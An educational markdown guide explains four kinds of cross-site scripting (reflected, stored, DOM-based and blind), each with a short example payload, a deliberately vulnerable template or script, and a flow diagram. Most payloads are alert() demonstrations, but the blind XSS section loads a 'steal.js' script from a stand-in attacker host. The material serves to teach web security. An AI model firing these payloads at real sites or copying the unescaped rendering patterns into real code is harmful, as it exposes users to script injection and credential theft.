# Cross-Site Scripting (XSS) Attack Types with Examples and Flow

This document explains the four main types of XSS vulnerabilities using code examples, execution flows (as flowchart arrows), and concise summaries.

---

## 1. Reflected XSS

### 💡 Summary

Payload is included in the request and immediately reflected in the response.

### 📜 Example

```http
GET /search?query=<script>alert(1)</script> HTTP/1.1
Host: example.com
```

```html
<!-- vulnerable server-side HTML -->
<h1>Search Results for: <%= req.query.query %></h1>
```

### 🔁 Flow

```
[Attacker] ──> [Victim clicks crafted link] ──> [Server reflects input] ──> [Browser executes payload]
```

---

## 2. Stored XSS

### 💡 Summary

Payload is stored (e.g., in a DB) and shown later to any visitor.

### 📜 Example

```html
<!-- Attacker posts this comment -->
<form action="/comment" method="POST">
  <input name="content" value='<script>alert("XSS")</script>' />
</form>
```

```html
<!-- Server later renders this -->
<p>Comment: <%= comment.content %></p>
```

### 🔁 Flow

```
[Attacker] ──> [Payload stored in DB] ──> [Victim visits page] ──> [Server renders payload] ──> [Browser executes it]
```

---

## 3. DOM-Based XSS

### 💡 Summary

Client-side JavaScript reads user-controlled input and directly modifies the DOM.

### 📜 Example

```html
<!-- Vulnerable client-side JS -->
<script>
  const search = location.hash.slice(1);
  document.body.innerHTML += `<h1>${search}</h1>`;
</script>
```

```url
http://example.com/#<script>alert('DOM XSS')</script>
```

### 🔁 Flow

```
[Attacker sends crafted URL] ──> [Victim opens it] ──> [JS reads location.hash] ──> [JS injects into DOM] ──> [Payload executes]
```

---

## 4. Blind XSS

### 💡 Summary

Stored XSS that executes in a context the attacker doesn't see directly (e.g., admin panel).

### 📜 Example

```html
<!-- Attacker submits contact form -->
<form action="/support" method="POST">
  <input name="message" value='<script src="http://attacker.com/steal.js"></script>' />
</form>
```

```html
<!-- Admin views messages in their dashboard -->
<p>Message: <%= message %></p>
```

### 🔁 Flow

```
[Attacker submits payload] ──> [Server stores it] ──> [Admin opens dashboard] ──> [Payload executes in admin browser] ──> [Attacker gets callback]
```

---


